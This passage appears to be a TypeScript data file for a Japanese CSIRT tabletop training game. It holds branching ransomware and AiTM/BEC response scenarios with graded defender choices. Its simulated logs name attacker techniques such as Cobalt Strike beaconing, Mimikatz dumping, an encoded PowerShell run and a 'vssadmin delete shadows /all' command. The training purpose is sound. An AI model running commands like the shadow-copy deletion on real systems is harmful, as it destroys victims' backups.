import { IncidentScenario } from '../types/security';

export const INCIDENT_SCENARIOS: IncidentScenario[] = [
  {
    id: 'scenario_ransomware',
    title: '二重脅迫ランサムウェア侵入 & 横展開インシデント',
    subtitle: '実在モデル: 国内サプライチェーン 二重恐喝ランサムウェア侵入 (LockBit / BlackCat類似事案)',
    difficulty: '中級 (実務CSIRT)',
    category: 'Ransomware',
    estimatedTime: '15〜20分',
    initialNodeId: 'rw_01_alert',
    initialMetrics: {
      spread: 25,
      exfiltration: 15,
      downtime: 10,
      trust: 90,
    },
    briefing: {
      targetOrganization: '東証プライム上場 精密機器メーカー（社員3,200名）',
      discoveredAlert: '営業本部PC [WKSTN-SALES-042] にて、PowerShellによる異常な暗号化プロセスおよびCobalt Strikeビーコン通信を検知。',
      incidentOfficer: 'CSIRT初動対応チーム リーダー（インシデントコマンダー代行）',
      immediateObjective: 'ランサムウェアの基幹サーバー・ADドメインへの横展開阻止、機密データ流出防止、および法廷フォレンジック証拠の保全。',
    },
    imagePath: '/src/assets/images/scenario_ransomware_1793333674033.jpg',
    nodes: {
      rw_01_alert: {
        id: 'rw_01_alert',
        phase: 'Phase 1: 初動検知・トリアージ (T+00:00)',
        title: '不審な難読化PowerShellとC2通信の検知',
        description: '午前09時14分、SOCコンソールに重大度CRITICALのアラートが発報。営業部PCから不審な外部IPへのHTTPSビーコンと、lsass.exeプロセスへのインジェクション試行が記録されています。',
        severity: 'critical',
        situationSummary: '感染端末は社内VLANに接続されたまま。ファイルサーバーへのアクセスログが増加中。',
        telemetryLogs: [
          { timestamp: '09:14:02', source: 'CrowdStrike EDR', level: 'CRITICAL', message: 'Process Injection into lsass.exe detected on WKSTN-SALES-042 (PID: 4912)' },
          { timestamp: '09:14:15', source: 'Palo Alto FW', level: 'ALERT', message: 'Repeated beaconing to 194.38.20.14:443 (Known Cobalt Strike Team Server)' },
          { timestamp: '09:15:30', source: 'Windows Sysmon', level: 'WARN', message: 'powershell.exe -enc SQBFAFgA... executed with Elevated Privileges' }
        ],
        choices: [
          {
            id: 'c1_isolate_edr',
            label: 'EDR機能による該当端末のネットワーク論理隔離 (ホストアイソレーション)',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: 'EDRエージェントから当該端末の全ネットワーク通信を切断。EDR管理コンソール経由のリモートシェル・メモリ採取のみを維持する。',
            tacticalRationale: '最善の初動。端末の電源を切らずに横展開通信のみを瞬時に遮断できるため、揮発性メモリ(RAM)の認証情報や暗号化キーを保全したまま被害拡大を阻止できる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -5, downtime: 0, trust: 0 },
            logOutput: [
              '[EDR] Command dispatched: Host isolation successful for WKSTN-SALES-042.',
              '[EDR] Inbound/Outbound IP traffic dropped. Management channel retained.',
              '[SOC] C2 beaconing stopped from WKSTN-SALES-042.'
            ],
            nextNodeId: 'rw_02_lateral_investigation'
          },
          {
            id: 'c1_power_off',
            label: '端末担当者に電話し、直ちにPCの電源コンセントを抜くよう指示 (強制シャットダウン)',
            actionType: 'containment',
            timeCostMinutes: 12,
            description: '端末を強制終了させ、これ以上のファイル暗号化を物理的に停止させる。',
            tacticalRationale: '悪手。RAM内の揮発性データ（インジェクションされたマルウェアコード、未平文キー、ログイン中の特権クレデンシャル）が消失し、すでに別端末へ移行していた場合の追跡が極めて困難になる。',
            impact: { spread: 15, exfiltration: 10, downtime: 10, trust: -10 },
            logOutput: [
              '[HELP-DESK] User pulled power plug on WKSTN-SALES-042.',
              '[FORENSICS] Volatile memory (RAM) is lost permanently.',
              '[AD LOG] EventID 4624: Account DOMAIN\\sales_lead authenticated on FileServer-01 via Pass-the-Hash.'
            ],
            nextNodeId: 'rw_02_power_loss'
          },
          {
            id: 'c1_antivirus_scan',
            label: '端末には触れず、通常アンチウイルスのフルスキャンをリモート実行して様子見',
            actionType: 'investigation',
            timeCostMinutes: 45,
            description: 'スキャン完了を待ち、検知されたファイルを隔離する。',
            tacticalRationale: '致命的遅延。Cobalt Strikeや最新ランサムウェアはメモリ展開型(Fileless)のため通常スキャンでは検知されず、45分の間にAD全域へ管理者権限が奪取される。',
            impact: { spread: 45, exfiltration: 40, downtime: 30, trust: -30 },
            logOutput: [
              '[AV] Full scan started... 15% complete.',
              '[AD LOG] CRITICAL: Kerberoasting attack detected. Ticket Granting Service requested for krbtgt.',
              '[EDR ALERT] Mimikatz credential dumping detected on Domain Controller DC-01!'
            ],
            nextNodeId: 'rw_02_full_spread'
          }
        ]
      },

      rw_02_lateral_investigation: {
        id: 'rw_02_lateral_investigation',
        phase: 'Phase 2: 侵害範囲特定と特権アカウント防衛 (T+00:15)',
        title: '横展開の兆候検知とActive Directory防衛',
        description: 'WKSTN-SALES-042の隔離に成功。メモリダンプの保全を開始した直後、AD監査ログにて「当該端末のキャッシュクレデンシャル」を用いたファイルサーバー(FS-01)へのアクセス試行が記録されたことが判明しました。',
        severity: 'high',
        situationSummary: '攻撃者は端末隔離の直前に社内管理者ハッシュを窃取していた可能性あり。ADドメイン全体への波及を阻止できるかの正念場。',
        telemetryLogs: [
          { timestamp: '09:22:10', source: 'AD Security Log', level: 'ALERT', message: 'EventID 4672: Special privileges assigned to logon user: adm_tanaka' },
          { timestamp: '09:23:44', source: 'FileServer-01', level: 'WARN', message: 'SMB Session initiated from 192.168.10.42 prior to isolation' },
          { timestamp: '09:25:01', source: 'Storage SAN', level: 'INFO', message: 'Volume Shadow Copies (VSS) active. Snapshot interval: 4 hours' }
        ],
        choices: [
          {
            id: 'c2_ad_reset_airgap',
            label: '侵害された管理者アカウントの無効化・krbtgt二重リセットおよびバックアップ装置の物理切断',
            actionType: 'containment',
            timeCostMinutes: 20,
            description: '疑わしい特権アカウントを即時無効化。ゴールデンチケット攻撃を防ぐためkrbtgtパスワードを2回更新し、オフライン・イミュータブル（変更不可）バックアップを切り離す。',
            tacticalRationale: '教科書通りの最善策。krbtgtパスワードを2回変更することで既存のKerberosチケットを全無効化し、バックアップへの暗号化波及を完全に遮断できる。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 15, trust: +5 },
            logOutput: [
              '[AD ADMIN] Account adm_tanaka disabled.',
              '[AD ADMIN] Krbtgt account password reset (Cycle 1 & Cycle 2 complete).',
              '[STORAGE] SAN immutable snapshots locked. Backup vault network interface detached.'
            ],
            nextNodeId: 'rw_03_exfil_defense'
          },
          {
            id: 'c2_password_only',
            label: 'adm_tanaka の通常パスワード変更のみ実施し、通常業務を継続',
            actionType: 'remediation',
            timeCostMinutes: 10,
            description: 'ユーザーにパスワード変更を依頼。バックアップシステムは夜間同期のため接続したままにする。',
            tacticalRationale: '重大な見落とし。攻撃者がすでにKerberos TGSチケットやゴールデンチケットを生成していた場合、パスワードを変更しても有効期限内は認証が通り続け、バックアップも標的になる。',
            impact: { spread: 25, exfiltration: 20, downtime: 10, trust: -15 },
            logOutput: [
              '[AD] Password for adm_tanaka changed by user.',
              '[AD AUDIT] Attacker reused valid Kerberos Ticket-Granting Ticket (TGT) to access Backup-NAS-01.',
              '[BACKUP] VSSadmin delete shadows /all command executed on Backup-NAS-01!'
            ],
            nextNodeId: 'rw_03_backup_compromised'
          }
        ]
      },

      rw_02_power_loss: {
        id: 'rw_02_power_loss',
        phase: 'Phase 2: 電源遮断後の被害波及 (T+00:30)',
        title: '証拠消失とファイルサーバーでの暗号化開始',
        description: '電源切断により端末は沈黙しましたが、攻撃者はすでにファイルサーバー FS-01 に侵入していました。FS-01 上で「.lockbit」拡張子のファイルが生成され始め、デスクトップに脅迫状が表示されました。',
        severity: 'critical',
        situationSummary: '端末のメモリデータがないため初期侵入経路の特定が難航。共有フォルダーの暗号化が急速に進行中。',
        telemetryLogs: [
          { timestamp: '09:41:00', source: 'FS-01 Filesystem', level: 'CRITICAL', message: 'Mass file rename detected: *.xlsx -> *.xlsx.lockbit' },
          { timestamp: '09:42:15', source: 'Desktop FS-01', level: 'CRITICAL', message: 'Ransom note dropped: HOW_TO_RECOVER_FILES.txt' },
          { timestamp: '09:44:30', source: 'Palo Alto FW', level: 'ALERT', message: 'Outbound SFTP transfer to 45.142.214.88 (Volume: 14.8 GB)' }
        ],
        choices: [
          {
            id: 'c2b_isolate_vlan_san',
            label: 'サーバーVLANを全社から緊急遮断し、SANストレージのボリュームをリードオンリーに固定',
            actionType: 'containment',
            timeCostMinutes: 10,
            description: 'これ以上の暗号化進行を食い止めるため、共有ストレージをハードウェアレベルで書き込み禁止にする。',
            tacticalRationale: '暗号化の物理的停止。一部データは失われるが、基幹データベースや他部署への延焼を食い止め、復旧の足がかりを作れる。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: 15, downtime: 40, trust: -10 },
            logOutput: [
              '[NETWORK] Core Switch: VLAN 100 (Servers) isolated from user networks.',
              '[STORAGE] NetApp Volume snapshot read-only lock triggered.',
              '[FS-01] Encryption process errored: Access Denied (Read-only filesystem).'
            ],
            nextNodeId: 'rw_03_leak_extortion'
          },
          {
            id: 'c2b_call_ransom_number',
            label: '脅迫状に記載されたTorサイトにアクセスし、身代金額の交渉を開始する',
            actionType: 'communication',
            timeCostMinutes: 60,
            description: '犯人の要求金額と支払期日を確認し、復号キーの購入を試みる。',
            tacticalRationale: '危険極まりない。警察庁・JPCERT/CC・FBIの全指針で身代金支払いは強く非推奨。資金は犯罪組織を利するだけであり、復号キーが届かないか破損しているケースが半数以上。また二重恐喝は止まらない。',
            impact: { spread: 10, exfiltration: 40, downtime: 50, trust: -40 },
            logOutput: [
              '[THREAT INTEL] Contact established with "BlackByte/LockLeak" affiliate via Tor chat.',
              '[EXTORTIONIST] "Demand: $1.2M USD in Monero. We also possess 45GB of NDA engineering designs."',
              '[LEGAL RISK] Potential violation of anti-money laundering / sanction laws.'
            ],
            nextNodeId: 'rw_04_terminal_ransom_paid'
          }
        ]
      },

      rw_02_full_spread: {
        id: 'rw_02_full_spread',
        phase: 'Phase 2: 全面侵害とドメインコントローラー制圧 (T+01:00)',
        title: 'ドメイン全域へのランサムウェア一斉配信',
        description: 'フルスキャンを待つ間に、攻撃者はGPO（グループポリシー）を悪用して社内全PC・サーバーへ一斉に暗号化スクリプトを展開しました。全社で青い画面と警告音が鳴り響いています。',
        severity: 'critical',
        situationSummary: 'ドメインコントローラー含むサーバー80台、クライアント端末1,200台が暗号化。完全な事業停止。',
        telemetryLogs: [
          { timestamp: '10:14:00', source: 'Group Policy', level: 'CRITICAL', message: 'New GPO deployed: "SystemUpdate_Q4" containing malicious batch execution' },
          { timestamp: '10:18:22', source: 'SOC Monitoring', level: 'CRITICAL', message: '852 host heartbeats lost. Hard drive MBR/VSS corrupted.' }
        ],
        choices: [
          {
            id: 'c2c_disaster_recovery',
            label: '全社ネットワークの完全停止・BCP（事業継続計画）発動および外部フォレンジック専門機関の緊急招集',
            actionType: 'remediation',
            timeCostMinutes: 120,
            description: 'データセンターの物理回線を切断し、クリーンな環境でのゼロベース復旧計画へ切り替える。',
            tacticalRationale: '被害は甚大だが、これ以上の二重被害・外部への攻撃踏み台化を断ち切る唯一のプロフェッショナルな決断。',
            impact: { spread: 0, exfiltration: 30, downtime: 80, trust: -40 },
            logOutput: [
              '[EXECUTIVE] Crisis Management Committee assembled. BCP Level 3 declared.',
              '[EXTERNAL] Mandiant / Incident Response Firm deployed on-site.',
              '[NETWORK] Internet gateway physically pulled.'
            ],
            nextNodeId: 'rw_04_terminal_bcp_disaster'
          }
        ]
      },

      rw_03_exfil_defense: {
        id: 'rw_03_exfil_defense',
        phase: 'Phase 3: データ持ち出し防御と法的対応 (T+02:00)',
        title: '外向きC2トンネルの遮断と個人情報保護委員会報告',
        description: 'AD特権の失効とバックアップ隔離により暗号化の横展開は完全に停止。しかし、プロキシログから攻撃者が隔離直前の10分間に海外クラウドストレージへ約350MBの暗号化ZIPを送信していた痕跡が発見されました。',
        severity: 'medium',
        situationSummary: '暗号化被害は端末1台のみで封じ込め完了。焦点は「漏洩データの特定」と「法定義務の遵守」へ移行。',
        telemetryLogs: [
          { timestamp: '11:05:12', source: 'Web Proxy', level: 'WARN', message: 'POST to mega.nz (352 MB) from 192.168.10.42 before isolation' },
          { timestamp: '11:15:00', source: 'Forensics Tool', level: 'INFO', message: 'Memory analysis: Attacker compressed "C:\\Users\\sales\\Documents\\Q3_Clients.xlsx"' },
          { timestamp: '11:20:00', source: 'Compliance Alert', level: 'INFO', message: 'Personal Information Protection Act (PPC) 72-hour prompt report window running.' }
        ],
        choices: [
          {
            id: 'c3_ppc_reporting_forensics',
            label: 'フォレンジックによる漏洩範囲の確定、個人情報保護委員会への速報提出、および影響顧客への個別連絡準備',
            actionType: 'communication',
            timeCostMinutes: 90,
            description: '漏洩した顧客名簿（1,420件）を特定。個人情報保護法に基づき発覚後速やかに委員会へ報告し、透明性のある対応を実施する。',
            tacticalRationale: '完璧なコンプライアンス遵守。迅速な速報と顧客ケアにより、行政処分やレピュテーション失墜を最小限に防ぎ、企業の信頼回復を主導できる。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -5, downtime: 5, trust: +20 },
            logOutput: [
              '[LEGAL] Preliminary Report submitted to Personal Information Protection Commission (PPC).',
              '[PR] Internal stakeholder briefing completed. Customer hotline established.',
              '[FORENSICS] Memory dump validated: No other data exfiltrated.'
            ],
            nextNodeId: 'rw_04_terminal_contained_s'
          },
          {
            id: 'c3_coverup',
            label: '「暗号化が止まったので大事には至っていない」と判断し、役員会にも外部にも報告せず社内処理',
            actionType: 'communication',
            timeCostMinutes: 15,
            description: '漏洩規模が小さいため公表を見送り、社内処分のみで幕引きを図る。',
            tacticalRationale: '最悪の不祥事対応。後日ダークウェブにデータが投下された際、隠蔽が発覚して個人情報保護法違反（最大1億円の罰金や是正命令）および株価暴落・社会的制裁を招く。',
            impact: { spread: 10, exfiltration: 30, downtime: 0, trust: -60 },
            logOutput: [
              '[MANAGEMENT] Incident closed as "internal malfunction".',
              '[THREAT INTEL] +30 Days Later: 1,420 customer records leaked on BreachForums with corporate domain tag.',
              '[REGULATOR] Investigation opened by authorities regarding undisclosed data breach.'
            ],
            nextNodeId: 'rw_04_terminal_coverup_f'
          }
        ]
      },

      rw_03_backup_compromised: {
        id: 'rw_03_backup_compromised',
        phase: 'Phase 3: バックアップ喪失危機と復旧判断 (T+03:00)',
        title: 'オンラインバックアップの破壊と二重脅迫の本格化',
        description: 'TGSチケットを再利用され、接続されていたNASバックアップのシャドウコピーが消去されました。攻撃グループから「データ公開を止めたければ72時間以内に1億円を支払え」という警告文が届きました。幸い、前週のオフラインLTO磁気テープが金庫に保管されています。',
        severity: 'critical',
        situationSummary: 'オンラインデータは全滅。前週のテープバックアップから1週間のデータ欠損を許容して自力再構築するか、身代金を支払うかの選択。',
        telemetryLogs: [
          { timestamp: '12:00:10', source: 'NAS Monitor', level: 'CRITICAL', message: 'Storage pool formatted by compromised admin credentials' },
          { timestamp: '12:15:00', source: 'IT Ops', level: 'INFO', message: 'Physical LTO-8 tape vault verified: Data intact up to last Friday 23:59' }
        ],
        choices: [
          {
            id: 'c3b_restore_tape',
            label: '金庫のオフラインLTOテープからクリーンな予備機へゼロ復旧を実施（1週間の業務再入力）',
            actionType: 'remediation',
            timeCostMinutes: 180,
            description: '身代金は一切拒絶。警察（サイバー犯罪対策課）へ被害届を出し、テープバックアップから業務システムを再構築する。',
            tacticalRationale: '実務的な王道。1週間のデータ損失と復旧コストは発生するが、犯罪組織への資金提供を拒み、確実に健全な環境で業務再開できる。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 15, downtime: 30, trust: +10 },
            logOutput: [
              '[RECOVERY] Clean hardware initialized in isolated staging DMZ.',
              '[OPS] LTO tape restoration verified. 98.2% data consistency achieved.',
              '[POLICE] Damage report accepted by Prefectural Police Cyber Division.'
            ],
            nextNodeId: 'rw_04_terminal_tape_restored_b'
          }
        ]
      },

      rw_03_leak_extortion: {
        id: 'rw_03_leak_extortion',
        phase: 'Phase 3: データ漏洩阻止と事業継続 (T+04:00)',
        title: 'サーバー隔離完了と漏洩データ精査',
        description: 'サーバーVLANの遮断により暗号化の拡散は食い止めたものの、攻撃者が持ち出した14.8GBのデータの中身の特定が必要です。顧客情報、特許図面、財務情報が含まれている可能性があります。',
        severity: 'high',
        situationSummary: '暗号化停止。事業停止期間の短縮と、情報漏洩に対する顧客・監督官庁対応が最重要課題。',
        telemetryLogs: [
          { timestamp: '13:00:00', source: 'SOC Forensics', level: 'INFO', message: 'Exfiltration dump analyzed: Marketing presentations and 3,000 partner contact emails.' },
          { timestamp: '13:30:00', source: 'Crisis Team', level: 'WARN', message: 'Media inquiries incoming regarding system outage on corporate website.' }
        ],
        choices: [
          {
            id: 'c3c_transparent_pr',
            label: '公式アナウンスの即時発表（第一報）と、外部フォレンジック検証による復旧スケジュールの開示',
            actionType: 'communication',
            timeCostMinutes: 60,
            description: '「現在調査中であり特定システムを安全のため計画停止中」であることを公表し、憶測による風評被害を防ぐ。',
            tacticalRationale: '危機管理広報の鉄則。隠蔽や沈黙はパニックと不信を呼ぶ。事実と対策を透明に開示することで信頼を維持できる。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 0, downtime: 10, trust: +15 },
            logOutput: [
              '[PR] First Holding Statement published on corporate portal.',
              '[CALL CENTER] Customer briefing script distributed to account managers.',
              '[JPCERT] Technical incident indicator sharing submitted.'
            ],
            nextNodeId: 'rw_04_terminal_damage_contained_a'
          }
        ]
      },

      // TERMINAL OUTCOMES
      rw_04_terminal_contained_s: {
        id: 'rw_04_terminal_contained_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク勝利】完璧な初動封じ込めと法規範遵守',
        description: 'あなたの指揮により、ランサムウェアの横展開は端末1台のみで完全遮断され、Active Directoryの防衛に成功しました。RAM証拠保全により侵入経路（標的型メールの添付PDF）も特定され、個人情報保護法に基づく72時間以内報告も完了しました。',
        severity: 'contained',
        situationSummary: '組織的被害: 極小。業務停止: なし。法的リスク: 回避。',
        telemetryLogs: [
          { timestamp: '15:30:00', source: 'CSIRT Commander', level: 'INFO', message: 'Incident Status: CLOSED. All IoCs isolated.' },
          { timestamp: '15:35:00', source: 'Executive Board', level: 'INFO', message: 'Board Commendation issued to CSIRT triage team.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '最高水準のインシデントハンドリング',
          summary: '「電源を切らず論理隔離」「krbtgtパスワード二重リセット」「オフラインバックアップ即時保護」「72時間以内PPC報告」という実務上最も重要な4大鉄則をすべて完遂しました。',
          financialEstimate: '被害損害額: 約150万円（端末再セットアップ・フォレンジック検証費のみ）/ 想定被害回避額: 約4.8億円',
          legalImpact: '個人情報保護法遵守により行政指導・課徴金リスクを完全回避。顧客離反ゼロ。',
          complianceStatus: 'NIST CSF 2.0 (Protect / Detect / Respond) 評価: Tier 4 (Adaptive)',
          recommendedPractices: [
            'EDRによるホスト論理隔離は電源オフより優先される（RAM保全の徹底）',
            'ドメイン特権漏洩の疑いがある場合、通常パスワード変更ではなく krbtgt の2回リセットが必須',
            '漏洩が判明した際は個人情報保護委員会への速報（3〜5日以内が実務目安・原則72時間）を遵守する'
          ]
        }
      },

      rw_04_terminal_damage_contained_a: {
        id: 'rw_04_terminal_damage_contained_a',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Aランク】被害限定と堅実な広報・復旧',
        description: '電源切断のミスや一部暗号化の発生はあったものの、ストレージのライトプロテクトと迅速な広報開示により大惨事を防ぎました。',
        severity: 'contained',
        situationSummary: '一部ファイルサーバー暗号化、データ漏洩軽微。業務停止2日。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'CSIRT', level: 'INFO', message: 'Server VLAN cleaned and restored from read-only snapshots.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'A',
          title: '被害を最小限に抑制した危機対応',
          summary: '初動で揮発性メモリを失ったハンディキャップを、ネットワークVLAN隔離と透明性のある危機広報でカバーしました。',
          financialEstimate: '被害損害額: 約1,200万円（サーバー復旧・外部フォレンジック・業務遅延）',
          legalImpact: '顧客への早期説明により集団訴訟等の重大法的リスクを抑制。',
          complianceStatus: 'NIST CSF 評価: Tier 3 (Repeatable)',
          recommendedPractices: [
            '端末の強制電源断は最終手段とし、現場社員に「LANケーブルを抜くかWi-Fiを切る」手順を徹底教育する',
            'ストレージのイミュータブル（不変）スナップショット機能を平時から有効化しておく'
          ]
        }
      },

      rw_04_terminal_tape_restored_b: {
        id: 'rw_04_terminal_tape_restored_b',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Bランク】身代金拒否とオフライン復旧の完遂',
        description: 'オンラインデータは失われ1週間のデータ入力ロスが発生しましたが、オフライン磁気テープの存在により犯罪組織へ1円も支払わずにシステムを再建しました。',
        severity: 'medium',
        situationSummary: '業務復旧まで5日間を要したものの、組織の主権を維持。',
        telemetryLogs: [
          { timestamp: '17:00:00', source: 'IT Operations', level: 'INFO', message: 'Base core ERP running from validated LTO-8 tape set.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'B',
          title: '屈服せず自力再建を成し遂げた防衛戦',
          summary: '3-2-1バックアップルール（うち1つは物理的に隔離されたエアギャップ）が最後の砦として機能しました。',
          financialEstimate: '被害損害額: 約4,500万円（1週間の業務停滞・手動再入力コスト）',
          legalImpact: '警察との連携により刑事捜査協力、制裁法違反はなし。',
          complianceStatus: 'NIST CSF 評価: Tier 2 (Risk Informed)',
          recommendedPractices: [
            '「エアギャップ（物理隔離）バックアップ」の定期的なリストア訓練を四半期ごとに実施する',
            'TGSチケット窃取を封じるため、特権アクセス管理(PAM)と階層化管理モデル(Tiering)を導入する'
          ]
        }
      },

      rw_04_terminal_ransom_paid: {
        id: 'rw_04_terminal_ransom_paid',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Cランク・失敗】身代金支払いと二重被害',
        description: '身代金1億2,000万円を暗号資産で支払ったものの、受領された復号プログラムは不具合が多く半分以上のデータベースが復旧不能でした。さらに2週間後、別のアフィリエイトから「元データのコピーを暴露する」と追加要求が届きました。',
        severity: 'critical',
        situationSummary: '莫大な金銭喪失、二重脅迫の継続、反社会的勢力への資金供与疑惑。',
        telemetryLogs: [
          { timestamp: '18:00:00', source: 'Crypto Wallet', level: 'ALERT', message: 'Monero transaction confirmed to threat actor wallet.' },
          { timestamp: '18:30:00', source: 'Decryption Tool', level: 'CRITICAL', message: 'Decryption error on MSSQL databases: Key mismatch / file corrupted.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'C',
          title: '身代金支払いによる泥沼化',
          summary: 'ランサムウェア犯罪者に身代金を支払っても、データが元通りに戻る保証は一切ありません。反社会的勢力への利益供与として株主代表訴訟の対象にもなり得ます。',
          financialEstimate: '被害損害額: 約1億8,000万円（身代金 + 復旧不能損害 + システム刷新費）',
          legalImpact: 'マネーロンダリング・国際制裁規制への抵触懸念、株主代表訴訟リスク。',
          complianceStatus: 'NIST CSF 評価: Tier 1 (Partial)',
          recommendedPractices: [
            '「身代金は絶対に支払わない」ことを経営方針・BCP規程として事前に明文化しておく',
            '復旧は常に「検証済みのバックアップ」からのリストアを前提に設計する'
          ]
        }
      },

      rw_04_terminal_coverup_f: {
        id: 'rw_04_terminal_coverup_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク・最悪】情報隠蔽による社会的制裁と経営破綻危機',
        description: '社内だけで収めようとした事件は、攻撃者がダークウェブに顧客データを公開したことで白日の下に晒されました。隠蔽工作が報じられ、取引先からの契約解除が殺到、個人情報保護法違反による刑事告発と巨額の課徴金が課されました。',
        severity: 'critical',
        situationSummary: '組織的隠蔽が発覚。信用失墜、取締役全員引責辞任、株価70%下落。',
        telemetryLogs: [
          { timestamp: '09:00:00', source: 'National News', level: 'CRITICAL', message: 'Major precision equipment maker accused of covering up massive data breach.' },
          { timestamp: '09:30:00', source: 'Regulatory Authority', level: 'CRITICAL', message: 'Administrative order and investigation issued under Act on Protection of Personal Information.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'セキュリティインシデント隠蔽の末路',
          summary: '技術的な失敗以上に、「インシデントの不都合な事実を隠蔽した」組織ガバナンスの崩壊が致命傷となりました。現代のサイバーインシデントでは隠し通すことは不可能です。',
          financialEstimate: '被害損害額: 約12億円以上（損害賠償・課徴金・取引停止・株価下落）',
          legalImpact: '個人情報保護法違反による罰則・民事損害賠償請求・役員賠償責任。',
          complianceStatus: 'コンプライアンス破綻',
          recommendedPractices: [
            '「インシデントの迅速な報告と誠実な公表」こそが最大の法的防衛手段である',
            '内部通報・CSIRTのエスカレーションラインが経営陣の保身で止まらない独立体制を構築する'
          ]
        }
      },

      rw_04_terminal_bcp_disaster: {
        id: 'rw_04_terminal_bcp_disaster',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Cランク】初動遅延による全滅と長期復興戦',
        description: 'フルスキャンを待つという初動の45分間の遅延により、ドメインコントローラーが掌握されて全社停止に追い込まれました。BCP発動によりなんとか犯罪者への屈服は免れましたが、再建には3ヶ月を要します。',
        severity: 'critical',
        situationSummary: '全社端末・サーバー初期化。完全なゼロベース再構築。',
        telemetryLogs: [
          { timestamp: '19:00:00', source: 'CSIRT', level: 'WARN', message: 'Factory lines operating via manual pen & paper.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'C',
          title: '初動の判断停止が招いた組織全壊',
          summary: '「何をしていいかわからずスキャンを待つ」という初動の遅延が、数分で拡散する最新マルウェアに対して命取りとなりました。',
          financialEstimate: '被害損害額: 約3億5,000万円（生産ライン停止・再構築人件費）',
          legalImpact: 'サプライチェーン納期遅延による違約金発生。',
          complianceStatus: 'NIST CSF 評価: Tier 1 (Partial)',
          recommendedPractices: [
            '「疑わしきは直ちに隔離」の原則を自動化（SOARやEDR自動修復ルール）する',
            '管理者の手動判断を待たずに不審通信を自動遮断するゼロトラストポリシーを敷く'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_aitm_bec',
    title: 'AiTMフィッシング & セッションハイジャック (MFA突破型BEC詐欺)',
    subtitle: '実在モデル: Evilginx等のリバースプロキシによるAiTMセッションハイジャック & M365不正送金 (BEC)',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'BEC & Phishing',
    estimatedTime: '15分',
    initialNodeId: 'aitm_01_alert',
    initialMetrics: {
      spread: 10,
      exfiltration: 30,
      downtime: 5,
      trust: 95,
    },
    briefing: {
      targetOrganization: '総合商社（海外取引高 月間30億円）',
      discoveredAlert: 'CFO（最高財務責任者）のアカウントが、ナイジェリア・ラゴスのIPから認証成功。MFA要求を伴わずにExchange Onlineへアクセス。',
      incidentOfficer: '情報セキュリティ室長（CISO直属）',
      immediateObjective: 'リバースプロキシ型フィッシングによるセッション乗っ取りの無効化、不正なメール転送ルールの排除、および海外銀行送金の差し止め。',
    },
    imagePath: '/src/assets/images/soc_incident_command_1793333672915.jpg',
    nodes: {
      aitm_01_alert: {
        id: 'aitm_01_alert',
        phase: 'Phase 1: 不正サインイン検知とセッション特定 (T+00:00)',
        title: 'MFAを通過した不審な海外セッション',
        description: 'Microsoft Entra ID (旧Azure AD) のリスク検知で、CFOの普段と異なる国（ナイジェリア）からのサインインが報告されました。「MFA突破」ではなく、Evilginx2等のリバースプロキシによって「認証済みセッションCookie (ESTSAUTH)」を盗難された可能性が極めて高いです。',
        severity: 'critical',
        situationSummary: 'CFOは東京本社で会議中。現在も海外IPからWeb版Outlookへのアクセスが継続しています。',
        telemetryLogs: [
          { timestamp: '14:02:11', source: 'Entra ID Protection', level: 'CRITICAL', message: 'Impossible travel alert: cfo@trading-corp.jp logged in from Lagos, Nigeria (IP: 102.89.33.12)' },
          { timestamp: '14:02:30', source: 'Unified Audit Log', level: 'ALERT', message: 'Authentication Method: Session Cookie Replay (No MFA prompt triggered)' },
          { timestamp: '14:03:55', source: 'Exchange Online', level: 'WARN', message: 'MailItemsAccessed: Folder "Sent Items", "Invoices_2026"' }
        ],
        choices: [
          {
            id: 'c1_revoke_tokens_ca',
            label: 'Microsoft Graph APIによる「全アクティブセッションの即時無効化 (Revoke-AzureADUserAllRefreshToken)」とFIDO2パスキー限定の条件付きアクセスポリシー適用',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '盗まれたセッションCookieとリフレッシュトークンを即時失効させ、再認証を強制。中間者攻撃耐性のあるFIDO2/WebAuthn認証のみを許可する。',
            tacticalRationale: '完璧な技術対応。単なるパスワード変更では既存のセッションCookieを無効化できないため、トークン失効コマンドの実行が最重要。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -15, downtime: 0, trust: +5 },
            logOutput: [
              '[ENTRA ID] Revoke-MgUserSignSession executed for cfo@trading-corp.jp.',
              '[ENTRA ID] All active OAuth2 tokens invalidated across all devices.',
              '[SOC] Attacker session terminated: HTTP 401 Unauthorized.'
            ],
            nextNodeId: 'aitm_02_mailbox_audit'
          },
          {
            id: 'c1_password_reset_only',
            label: 'CFOに内線電話し、M365のパスワードを変更してもらう',
            actionType: 'remediation',
            timeCostMinutes: 20,
            description: 'パスワードを推測困難な長いものに変えさせる。',
            tacticalRationale: '致命的な勘違い。AiTM攻撃で盗まれたのは「セッションCookie」であるため、パスワードを変更してもCookieの有効期限（通常24時間〜数日）が切れるまで攻撃者はそのままメールボックスを操作し続けられる。',
            impact: { spread: 15, exfiltration: 25, downtime: 0, trust: -15 },
            logOutput: [
              '[HELP-DESK] CFO changed password.',
              '[M365 AUDIT] Attacker session remains ACTIVE via persistent ESTSAUTH cookie.',
              '[EXCHANGE] New-InboxRule: Rule "SystemForward" created silently by attacker.'
            ],
            nextNodeId: 'aitm_02_invoice_divert'
          }
        ]
      },

